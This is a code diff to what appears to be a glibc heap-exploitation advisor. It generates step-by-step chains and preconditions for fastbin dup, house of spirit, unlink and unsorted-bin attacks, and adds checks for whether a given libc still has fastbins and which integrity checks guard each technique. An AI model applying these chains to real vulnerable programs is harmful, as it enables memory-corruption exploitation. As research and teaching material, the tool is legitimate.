@@ -107,8 +107,50 @@ def _fill_tcache(size):
             "that size-class's tcache bin, so the next frees reach the fastbin (glibc>=2.26)"}
 
 
+def _fastbins(e: Env) -> dict:
+    """Whether this environment still HAS fastbins. Read from the libc's bytes when we have them
+    (the `fasttop` check and the `mxfast` knob exist only where fastbins do), otherwise unknown --
+    and never defaulted to yes, because on current glibc the answer is no."""
+    from . import heap as _heap
+    if e.libc_data:
+        return _heap.fastbins_present(e.libc_data)
+    return {"present": None, "glibc": ".".join(str(x) for x in e.glibc),
+            "reason": "no libc bytes supplied, so whether this glibc still has fastbins is "
+                      "UNKNOWN -- pass Env(libc_data=...) to decide it. Do not assume yes: "
+                      "fastbins are gone from 2.43"}
+
+
+def _check_verdict(e: Env, message: bytes, what: str, blocks: str) -> dict:
+    """A yes/no on one allocator check, by counting the jumps that reach its error string."""
+    from . import heap as _heap
+    if not e.libc_data:
+        return {"present": None,
+                "reason": f"no libc bytes supplied, so whether {what} is UNKNOWN -- pass "
+                          "Env(libc_data=...) to decide it"}
+    sites = _heap.guard_sites(e.libc_data, message)
+    if sites is None and e.libc_data.find(message) < 0:
+        return {"present": False, "reason": f"{what}: the check is not in this libc at all"}
+    if sites is None:
+        return {"present": None,
+                "reason": f"{what}: the check's string is here but its reference could not be "
+                          "located, so the sites cannot be counted"}
+    return {"present": True, "sites": sites,
+            "reason": f"{what}: present, {sites} site(s) -- {blocks}"}
+
+
 def _fastbin_dup(v: Vuln, g: Goal, e: Env):
     cs = request2size(v.size)
+    fb = _fastbins(e)
+    if fb["present"] is False:
+        # Not blocked by a check -- there is no fastbin to dup into. Say which evidence says so.
+        return ([{"op": "note", "detail": fb["reason"]},
+                 {"op": "note", "detail":
+                  "a free past the tcache lands in a bin, which unlinks with the full check set, "
+                  "so the cheap singly-linked push this technique is built on does not exist. "
+                  "Use tcache_poisoning (same size class, already driven) or tcache_stashing."}],
+                ["BLOCKED: " + fb["reason"],
+                 "confirm with heap.post_tcache_destination(): it reports \"bin\" here and "
+                 "\"fastbin\" on a libc that still has them -- same probe binary, two libcs"])
     safe = _ver_ge(e.glibc, (2, 32))
     fd = ("mangle(addr(A), FAKE)  # fastbins are safe-linked in glibc>=2.32"
           if safe else "FAKE  # no safe-linking (glibc<2.32)")
@@ -128,27 +170,62 @@ def _fastbin_dup(v: Vuln, g: Goal, e: Env):
         {"op": "alloc", "handle": "___", "size": v.size, "note": "returns A (2nd time)"},
         {"op": "alloc", "handle": "OUT", "size": v.size, "note": "returns FAKE"},
     ]
-    return steps, ["fastbin-size chunk (chunk 0x20..0x80)",
-                   f"a fake chunk near TARGET with size field == {hex(cs)} at TARGET-0x8",
-                   "fill the tcache first so frees reach the fastbin"]
+    precond = ["fastbin-size chunk (chunk 0x20..0x80)",
+               f"a fake chunk near TARGET with size field == {hex(cs)} at TARGET-0x8",
+               "fill the tcache first so frees reach the fastbin -- and fill it to its MEASURED "
+               "capacity, not to 7"]
+    if fb["present"] is None:
+        precond.append("UNVERIFIED: " + fb["reason"])
+    return steps, precond
+
+
+def _fastbin_dup_primitive(e: Env) -> str:
+    fb = _fastbins(e)
+    if fb["present"] is False:
+        return "nothing: this libc has no fastbins"
+    if fb["present"] is None:
+        return "arbitrary allocation (unverified: no libc supplied, and 2.43 has no fastbins)"
+    return "arbitrary allocation"
 
 
 def _house_of_spirit(v: Vuln, g: Goal, e: Env):
     cs = request2size(v.size)
-    fast = is_fastbin(cs)                        # only the fastbin path checks the next size
+    fb = _fastbins(e)
+    # Where the forged chunk actually goes decides which checks it has to survive. With fastbins
+    # gone the classic "forge a fastbin-size chunk" framing is wrong: a tcache-range chunk lands
+    # in the TCACHE, which has its own checks, and anything bigger lands in a bin with the full
+    # set -- so this technique did not die with the fastbins, it moved.
+    fast = is_fastbin(cs) and fb["present"] is not False
+    dest = "fastbin" if fast else ("tcache" if in_tcache_range(cs) else "a bin")
     steps = [
         {"op": "forge", "detail": f"in controlled memory build a fake chunk: size field = "
          f"{hex(cs | 1)} ({hex(cs)} | PREV_INUSE), 16-byte aligned user pointer"},
         {"op": "forge", "detail": f"set the *next* chunk's size (at +{hex(cs)}) to a sane "
          "value, e.g. 0x21, to pass the next-size sanity check", "optional": not fast},
-        {"op": "free", "handle": "FAKE", "detail": "free(&fake.userdata) -- the fake chunk "
-         f"enters the {'fastbin' if is_fastbin(cs) else 'tcache'}"},
+        {"op": "free", "handle": "FAKE",
+         "detail": f"free(&fake.userdata) -- the fake chunk enters {dest}"},
         {"op": "alloc", "handle": "OUT", "size": v.size,
          "note": "returns &fake.userdata -- an allocation over attacker-controlled memory"},
     ]
-    return steps, [f"a writable region you can forge a {hex(cs)} chunk header in",
-                   "the fake user pointer must be 16-byte aligned",
-                   "yields a chunk overlapping controlled memory (then write through it)"]
+    precond = [f"a writable region you can forge a {hex(cs)} chunk header in",
+               "the fake user pointer must be 16-byte aligned",
+               "yields a chunk overlapping controlled memory (then write through it)",
+               f"on this libc the forged chunk lands in {dest}"]
+    if dest == "tcache":
+        precond += ["the tcache's own checks apply: 16-byte alignment "
+                    "(\"free(): unaligned chunk detected in tcache 2\"), a size field whose "
+                    "tcache index matches the bin, and a `key` field that must not already equal "
+                    "tcache_key (\"free(): double free detected in tcache 2\") -- zero the "
+                    "forged chunk's +0x8 word",
+                    "no next-size check on this path, which makes it EASIER than the fastbin "
+                    "form, not harder"]
+    elif dest == "a bin":
+        precond.append("a bin free runs the full check set: \"free(): invalid size\", "
+                       "\"free(): invalid next size (normal)\" and the consolidation checks, so "
+                       "the next chunk's size field has to be forged sanely too")
+    if fb["present"] is False:
+        precond.append("note: " + fb["reason"])
+    return steps, precond
 
 
 def _house_of_force(v: Vuln, g: Goal, e: Env):
@@ -177,9 +254,19 @@ def _unlink(v: Vuln, g: Goal, e: Env):
         {"op": "write", "handle": "P", "detail": "P now points 0x18 before itself; writing "
          "through P overwrites P (and neighbours) with attacker data"},
     ]
-    return steps, ["heap overflow into an adjacent chunk",
-                   "a known pointer &P to a controlled chunk",
-                   "passes the modern fd/bk consistency check"]
+    chk = _check_verdict(e, b"corrupted double-linked list\x00",
+                         "the unlink fd/bk consistency check",
+                         "the forged fd/bk MUST satisfy fd->bk == P and bk->fd == P, which is "
+                         "what makes this a write of &P-0x18 into P rather than an arbitrary one")
+    steps.append({"op": "note", "detail": chk["reason"]})
+    precond = ["heap overflow into an adjacent chunk",
+               "a known pointer &P to a controlled chunk",
+               "the write is &P-0x18 into P -- NOT an arbitrary value at an arbitrary address"]
+    precond.append(("constrained by: " if chk["present"] else "unconstrained here: ")
+                   + chk["reason"])
+    precond.append("also gated by \"corrupted size vs. prev_size\": the forged prev_size must "
+                   "match the fake chunk's size field exactly")
+    return steps, precond
 
 
 def _unsorted_bin_attack(v: Vuln, g: Goal, e: Env):
@@ -193,9 +280,28 @@ def _unsorted_bin_attack(v: Vuln, g: Goal, e: Env):
         {"op": "alloc", "handle": "_", "size": v.size,
          "note": "the malloc scans the unsorted bin and writes &main_arena.bins[..] to TARGET"},
     ]
-    return steps, ["non-fastbin (small) size",
-                   "writes an unchosen libc (main_arena) VALUE, not an arbitrary one",
-                   "glibc>=2.29 added a bk-integrity check -- pair with a large-bin attack"]
+    chk = _check_verdict(e, b"malloc(): unsorted double linked list corrupted\x00",
+                         "the unsorted-bin bk-integrity check",
+                         "the scan verifies `bck->fd == victim`, so TARGET must already hold "
+                         "&victim and the write is not free")
+    steps.append({"op": "note", "detail": chk["reason"]})
+    # The classic worked example for "an unchosen large value at a chosen address" is
+    # `global_max_fast`, which turns every later free into a fastbin free. That example is void on
+    # a libc with no fastbins, so name it only where it exists.
+    fb = _fastbins(e)
+    example = ("e.g. global_max_fast, which turns later frees into fastbin frees"
+               if fb["present"] else
+               "and the usual worked example, global_max_fast, does not exist on a libc without "
+               "fastbins -- so the deliverable has to be some counter in the TARGET program")
+    precond = ["non-fastbin (small) size",
+               "writes an unchosen libc (main_arena) VALUE, not an arbitrary one -- the "
+               f"deliverable is a counter/size overwrite, not data ({example})",
+               ("BLOCKED as a free write: " if chk["present"] else "unguarded here: ")
+               + chk["reason"]]
+    if chk["present"]:
+        precond.append("so pair it with a primitive that can seed TARGET first, or prefer "
+                       "tcache_stashing, whose stashing unlink is NOT checked")
+    return steps, precond
 
 
 def _tcache_stash(v: Vuln, g: Goal, e: Env):
@@ -347,6 +453,9 @@ def _large_bin_attack(v: Vuln, g: Goal, e: Env):
 # advisory techniques: preconditions, the primitive yielded, and a full generated chain.
 _ADVISORY = [
     {"technique": "fastbin_dup", "primitive": "arbitrary allocation",
+     "primitive_for": _fastbin_dup_primitive,
+     # Still LISTED where the size fits even when the libc has no fastbins: an omitted technique
+     # reads as "not considered", and the useful output is the reason it cannot work.
      "applies": lambda v, e: v.vclass in ("double_free", "uaf")
      and 0x20 <= request2size(v.size) <= 0x80,
      "build": _fastbin_dup, "confirmed": True,
